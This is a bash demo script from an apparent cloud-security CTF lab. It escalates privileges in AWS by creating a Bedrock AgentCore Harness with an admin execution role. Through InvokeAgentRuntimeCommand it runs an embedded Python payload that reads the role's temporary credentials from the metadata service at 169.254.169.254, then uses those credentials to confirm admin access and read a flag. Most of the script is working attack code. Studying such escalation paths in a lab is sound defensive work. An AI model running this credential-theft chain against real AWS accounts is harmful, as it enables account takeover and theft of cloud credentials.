#!/bin/bash

# Demo script for iam:PassRole + Bedrock AgentCore Harness Creation privilege escalation
# This scenario demonstrates how a user with PassRole and AgentCore Harness permissions can
# create a new Harness with a privileged execution role, then extract credentials from the
# MicroVM Metadata Service (MMDS) at 169.254.169.254 to gain admin access.
#
# The Harness API provisions an underlying AgentCore Runtime automatically. The attacker
# never needs to manage the runtime directly — InvokeAgentRuntimeCommand is called against
# the harness ARN, which routes the command into the runtime's MicroVM.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-bedrock-005-to-admin-starting-user"
TARGET_ROLE="pl-prod-bedrock-005-to-admin-target-role"
HARNESS_NAME="atk_harness_bedrock_005"
PYTHON_SCRIPT="/tmp/extract_bedrock_005_creds.py"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}AgentCore Harness Creation to Admin Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_bedrock_005_iam_passrole_bedrockagentcore_createharness.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
TARGET_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_arn')
MODEL_ID=$(echo "$MODULE_OUTPUT" | jq -r '.bedrock_model_id')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

if [ "$TARGET_ROLE_ARN" == "null" ] || [ -z "$TARGET_ROLE_ARN" ]; then
    echo -e "${RED}Error: Could not extract target role ARN from terraform output${NC}"
    exit 1
fi

if [ "$MODEL_ID" == "null" ] || [ -z "$MODEL_ID" ]; then
    echo -e "${YELLOW}Warning: Could not extract model ID from terraform output, defaulting to amazon.nova-micro-v1:0${NC}"
    MODEL_ID="amazon.nova-micro-v1:0"
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Target role ARN: $TARGET_ROLE_ARN"
echo "Model ID: $MODEL_ID"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Track harness ARN for the exit trap.
# Set HARNESS_ARN to a non-empty sentinel immediately before the CreateHarness API call
# so the trap fires even if the script is killed before we can read the response ARN.
HARNESS_ARN=""
HARNESS_ID=""
DEMO_COMPLETED=0

# Exit trap: best-effort delete the harness on any non-clean exit to avoid orphan charges.
# The harness provisions an underlying runtime that takes 2-5 min and is billed during that time.
_bedrock_005_exit_handler() {
    local exit_code=$?
    trap - EXIT INT TERM
    if [ -n "$HARNESS_ARN" ] && [ "$DEMO_COMPLETED" != "1" ]; then
        echo -e "${RED}[trap] Demo did not complete cleanly — best-effort deleting harness $HARNESS_ARN to avoid orphan charges${NC}"
        use_starting_creds
        aws bedrock-agentcore-control delete-harness \
            --harness-id "$HARNESS_ID" \
            --region "$AWS_REGION" >/dev/null 2>&1 || true
    fi
    restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml" 2>/dev/null || true
    exit $exit_code
}
trap _bedrock_005_exit_handler EXIT INT TERM

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Step 2: Check prerequisites
echo -e "${YELLOW}Step 2: Checking prerequisites${NC}"
echo "Verifying required tools are installed..."

if ! command -v jq &> /dev/null; then
    echo -e "${RED}Error: jq is not installed${NC}"
    echo "Please install jq: https://stedolan.github.io/jq/download/"
    exit 1
fi
echo -e "${GREEN}✓ jq is installed${NC}"

if ! command -v python3 &> /dev/null; then
    echo -e "${RED}Error: python3 is not installed${NC}"
    echo "Please install python3"
    exit 1
fi
echo -e "${GREEN}✓ python3 is installed${NC}"

if ! python3 -c "import boto3" &> /dev/null; then
    echo -e "${RED}Error: boto3 is not installed${NC}"
    echo "Please install boto3: pip3 install boto3"
    exit 1
fi
# InvokeAgentRuntimeCommand was added in botocore 1.43.36
BOTOCORE_VERSION=$(python3 -c "import botocore; print(botocore.__version__)" 2>/dev/null || echo "0.0.0")
BOTOCORE_REQUIRED="1.43.36"
python3 -c "
import sys
v = tuple(int(x) for x in '${BOTOCORE_VERSION}'.split('.'))
r = tuple(int(x) for x in '${BOTOCORE_REQUIRED}'.split('.'))
sys.exit(0 if v >= r else 1)
" 2>/dev/null
if [ $? -ne 0 ]; then
    echo -e "${RED}Error: botocore ${BOTOCORE_VERSION} is too old (need >= ${BOTOCORE_REQUIRED})${NC}"
    echo "Please upgrade: pip3 install --upgrade boto3 botocore"
    exit 1
fi
echo -e "${GREEN}✓ boto3 is installed (botocore ${BOTOCORE_VERSION})${NC}"
echo ""

# [EXPLOIT] Step 3: Configure AWS credentials with starting user and verify identity
echo -e "${YELLOW}Step 3: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 4: Get account ID
echo -e "${YELLOW}Step 4: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 5: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 6: Create the AgentCore Harness passing the target admin role
echo -e "${YELLOW}Step 6: Creating AgentCore Harness with admin execution role${NC}"
echo "Harness name: $HARNESS_NAME"
echo "Target role ARN: $TARGET_ROLE_ARN"
echo "Model ID: $MODEL_ID"
echo ""
echo "This is the privilege escalation vector — passing the admin role to a new AgentCore Harness."
echo "The Harness provisions an underlying runtime MicroVM with the execution role credentials"
echo "available via MMDS at 169.254.169.254. InvokeAgentRuntimeCommand can then run arbitrary"
echo "bash inside the MicroVM and read those credentials without ever invoking the model."
echo ""

show_attack_cmd "Attacker" "aws bedrock-agentcore-control create-harness --region $AWS_REGION --harness-name $HARNESS_NAME --execution-role-arn $TARGET_ROLE_ARN --model '{\"bedrockModelConfig\":{\"modelId\":\"$MODEL_ID\"}}'"

# Set HARNESS_ARN sentinel before the API call so the trap fires even if the script is
# killed between the call succeeding and our response-parsing code running.
HARNESS_ARN="pending"

CREATE_OUTPUT=$(aws bedrock-agentcore-control create-harness \
    --region "$AWS_REGION" \
    --harness-name "$HARNESS_NAME" \
    --execution-role-arn "$TARGET_ROLE_ARN" \
    --model "{\"bedrockModelConfig\":{\"modelId\":\"$MODEL_ID\"}}" \
    --memory '{"disabled":{}}' \
    --output json 2>&1)

CREATE_EXIT=$?

if [ $CREATE_EXIT -ne 0 ]; then
    echo -e "${RED}Error: Failed to create AgentCore Harness${NC}"
    echo "$CREATE_OUTPUT"
    HARNESS_ARN=""  # Clear sentinel so trap doesn't attempt a delete with a garbage ARN
    exit 1
fi

HARNESS_ARN=$(echo "$CREATE_OUTPUT" | jq -r '.harness.arn // empty')
# The delete/get APIs require the short harnessId, not the full ARN.
# Extract it from the response directly; fall back to stripping the ARN suffix.
HARNESS_ID=$(echo "$CREATE_OUTPUT" | jq -r '.harness.harnessId // empty')
if [ -z "$HARNESS_ID" ] && [ -n "$HARNESS_ARN" ]; then
    HARNESS_ID=$(echo "$HARNESS_ARN" | sed 's|.*[/:]harness/||')
fi

if [ -z "$HARNESS_ARN" ] || [ "$HARNESS_ARN" == "null" ]; then
    echo -e "${RED}Error: Could not parse harness ARN from create response${NC}"
    echo "$CREATE_OUTPUT"
    HARNESS_ARN=""
    HARNESS_ID=""
    exit 1
fi

echo "Harness ARN: $HARNESS_ARN"
echo "Harness ID : $HARNESS_ID"
echo -e "${GREEN}✓ Successfully created AgentCore Harness with admin execution role!${NC}"
echo ""

# [OBSERVATION] Step 7: Poll for the harness to reach READY state
# CreateHarness provisions an AgentCore Runtime under the hood. The harness ARN format is:
#   arn:aws:bedrock-agentcore:<region>:<account>:harness/<harness-id>
# There is no runtime ID embedded in the ARN, so we poll the harness status directly.
echo -e "${YELLOW}Step 7: Waiting for harness to reach READY state${NC}"
echo "This takes 2-5 minutes while AgentCore provisions the Firecracker MicroVM..."
echo ""

MAX_WAIT=300   # 5 minutes
POLL_INTERVAL=15
ELAPSED=0
RUNTIME_STATUS=""

use_starting_creds
export AWS_REGION=$AWS_REGION

while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "Attacker" "aws bedrock-agentcore-control get-harness --harness-id $HARNESS_ID --region $AWS_REGION --query 'status' --output text"
    RUNTIME_STATUS=$(aws bedrock-agentcore-control get-harness \
        --harness-id "$HARNESS_ID" \
        --region "$AWS_REGION" \
        --query 'harness.status' \
        --output text 2>/dev/null || echo "UNKNOWN")

    echo "  Status: $RUNTIME_STATUS (${ELAPSED}s elapsed)"

    if [ "$RUNTIME_STATUS" = "READY" ]; then
        echo -e "${GREEN}✓ Harness reached READY state${NC}"
        break
    fi

    if [ "$RUNTIME_STATUS" = "FAILED" ] || [ "$RUNTIME_STATUS" = "CREATE_FAILED" ]; then
        echo -e "${RED}Error: Harness provisioning failed (status: $RUNTIME_STATUS)${NC}"
        exit 1
    fi

    sleep $POLL_INTERVAL
    ELAPSED=$((ELAPSED + POLL_INTERVAL))
done

if [ "$RUNTIME_STATUS" != "READY" ]; then
    echo -e "${RED}Error: Harness did not reach READY state within ${MAX_WAIT}s (last status: $RUNTIME_STATUS)${NC}"
    exit 1
fi
echo ""

# Step 8: Create Python script to invoke harness and extract MMDS credentials
echo -e "${YELLOW}Step 8: Creating Python script to invoke harness and extract MMDS credentials${NC}"
echo "Creating script that uses InvokeAgentRuntimeCommand against the harness ARN..."

cat > "$PYTHON_SCRIPT" << 'PYEOF'
#!/usr/bin/env python3
"""
Bedrock AgentCore Harness Creation — Credential Extraction (bedrock-005)

Calls bedrock-agentcore:InvokeAgentRuntimeCommand against the Harness ARN.
The Harness routes the command into the underlying runtime's Firecracker
MicroVM. The command reads the execution role's temporary credentials from
MMDS at 169.254.169.254 via IMDSv2 and prints them to stdout.

Usage: python3 extract_bedrock_005_creds.py <harness_arn> <region>
"""

import boto3
import json
import sys
import uuid

if len(sys.argv) < 3:
    print("Usage: python3 extract_bedrock_005_creds.py <harness_arn> <region>")
    sys.exit(1)

HARNESS_ARN = sys.argv[1]
AWS_REGION  = sys.argv[2]

# Two-step MMDS read via Python stdlib. Curl may not be available in the
# managed harness container; Python is always present.
BASH_COMMAND = """python3 -c "
import urllib.request
BASE = 'http://169.254.169.254/latest'
tok_req = urllib.request.Request(BASE+'/api/token', method='PUT', headers={'X-aws-ec2-metadata-token-ttl-seconds':'60'})
with urllib.request.urlopen(tok_req, timeout=5) as r: token = r.read().decode().strip()
h = {'X-aws-ec2-metadata-token': token}
role_req = urllib.request.Request(BASE+'/meta-data/iam/security-credentials/', headers=h)
with urllib.request.urlopen(role_req, timeout=5) as r: role = r.read().decode().strip()
creds_req = urllib.request.Request(BASE+'/meta-data/iam/security-credentials/'+role, headers=h)
with urllib.request.urlopen(creds_req, timeout=5) as r: print(r.read().decode())
\""""

print(f"[*] Harness ARN : {HARNESS_ARN}", file=sys.stderr)
print(f"[*] Region      : {AWS_REGION}", file=sys.stderr)
print(f"[*] Calling bedrock-agentcore:InvokeAgentRuntimeCommand ...", file=sys.stderr)

client = boto3.client('bedrock-agentcore', region_name=AWS_REGION)

try:
    response = client.invoke_agent_runtime_command(
        agentRuntimeArn=HARNESS_ARN,
        runtimeSessionId=str(uuid.uuid4()),
        body={"command": BASH_COMMAND, "timeout": 30},
    )
except Exception as exc:
    print(f"[-] InvokeAgentRuntimeCommand failed: {exc}", file=sys.stderr)
    sys.exit(1)

stdout_chunks = []
for event in response["stream"]:
    chunk = event.get("chunk", {})
    if "contentDelta" in chunk:
        delta = chunk["contentDelta"]
        if "stdout" in delta:
            stdout_chunks.append(delta["stdout"])
        if "stderr" in delta and delta["stderr"].strip():
            print(f"[stderr] {delta['stderr'].strip()}", file=sys.stderr)

raw_output = "".join(stdout_chunks).strip()

if not raw_output:
    print("[-] No stdout received from harness command", file=sys.stderr)
    sys.exit(1)

try:
    creds = json.loads(raw_output)
    print(json.dumps(creds, indent=2))
except json.JSONDecodeError:
    print(raw_output)
PYEOF

echo -e "${GREEN}✓ Python script created at $PYTHON_SCRIPT${NC}\n"

# [EXPLOIT] Step 9: Invoke InvokeAgentRuntimeCommand to extract MMDS credentials
echo -e "${YELLOW}Step 9: Extracting admin credentials from MMDS via harness command${NC}"
echo "Running Python script to send bash command through InvokeAgentRuntimeCommand..."
echo "The command reads IMDSv2 credentials for the execution role at 169.254.169.254..."
echo ""

use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

show_attack_cmd "Attacker" "python3 $PYTHON_SCRIPT $HARNESS_ARN $AWS_REGION"
CREDS_JSON=$(python3 "$PYTHON_SCRIPT" "$HARNESS_ARN" "$AWS_REGION" 2>/dev/null)
PYTHON_EXIT=$?

if [ $PYTHON_EXIT -ne 0 ] || [ -z "$CREDS_JSON" ]; then
    echo -e "${RED}Error: Failed to extract credentials from MMDS${NC}"
    echo "Running again with verbose output for debugging:"
    python3 "$PYTHON_SCRIPT" "$HARNESS_ARN" "$AWS_REGION"
    rm -f "$PYTHON_SCRIPT"
    exit 1
fi

ADMIN_ACCESS_KEY=$(echo "$CREDS_JSON" | jq -r '.AccessKeyId // empty' 2>/dev/null)
ADMIN_SECRET_KEY=$(echo "$CREDS_JSON" | jq -r '.SecretAccessKey // empty' 2>/dev/null)
ADMIN_SESSION_TOKEN=$(echo "$CREDS_JSON" | jq -r '.Token // empty' 2>/dev/null)

if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" = "null" ]; then
    echo -e "${RED}Error: Could not parse credentials from MMDS response${NC}"
    echo "Raw MMDS response:"
    echo "$CREDS_JSON"
    rm -f "$PYTHON_SCRIPT"
    exit 1
fi

echo -e "${GREEN}✓ Successfully extracted credentials from MMDS${NC}"
echo -e "${GREEN}✓ Parsed AccessKeyId, SecretAccessKey, and SessionToken${NC}\n"

rm -f "$PYTHON_SCRIPT"

# Step 10: Switch to extracted admin credentials and verify identity
echo -e "${YELLOW}Step 10: Switching to extracted admin credentials${NC}"
export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
export AWS_SESSION_TOKEN="$ADMIN_SESSION_TOKEN"
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

show_cmd "Attacker (now admin)" "aws sts get-caller-identity --query 'Arn' --output text"
ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $ADMIN_IDENTITY"

if [[ $ADMIN_IDENTITY == *"$TARGET_ROLE"* ]]; then
    echo -e "${GREEN}✓ Successfully obtained admin role credentials via MMDS${NC}"
else
    echo -e "${YELLOW}⚠ Warning: Identity doesn't match expected role name${NC}"
fi
echo ""

# Step 11: Verify administrator access
echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 12: Capture the CTF flag from SSM Parameter Store
# The extracted execution role credentials carry AdministratorAccess, which includes
# ssm:GetParameter. No extra permissions are needed.
echo -e "${YELLOW}Step 12: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/bedrock-005-to-admin"

show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter \
    --name "$FLAG_PARAM_NAME" \
    --query 'Parameter.Value' \
    --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions before printing the summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
DEMO_COMPLETED=1

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Used iam:PassRole + CreateHarness to deploy a new Harness with the admin execution role"
echo "3. Waited for the underlying runtime to reach READY state (~2-5 min)"
echo "4. Invoked InvokeAgentRuntimeCommand to run a bash command inside the harness MicroVM"
echo "5. Bash command read IMDSv2 credentials for the execution role from MMDS at 169.254.169.254"
echo "6. Used extracted credentials to operate as the admin execution role"
echo "7. Read CTF flag from SSM Parameter Store"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER"
echo "  → (iam:PassRole + bedrock-agentcore:CreateHarness + CreateAgentRuntime"
echo "      + CreateAgentRuntimeEndpoint + CreateWorkloadIdentity)"
echo "  → Harness '$HARNESS_NAME' with $TARGET_ROLE as execution role"
echo "  → (bedrock-agentcore:InvokeAgentRuntimeCommand)"
echo "  → Bash reads MMDS at 169.254.169.254 for execution role credentials"
echo "  → $TARGET_ROLE (AdministratorAccess)"
echo "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- AgentCore Harness: $HARNESS_NAME (ARN: $HARNESS_ARN)"
echo "- Execution Role: $TARGET_ROLE"

echo -e "\n${RED}⚠ Warning: The AgentCore Harness '$HARNESS_NAME' is still deployed${NC}"
echo -e "${RED}⚠ AgentCore Harnesses incur charges while running${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
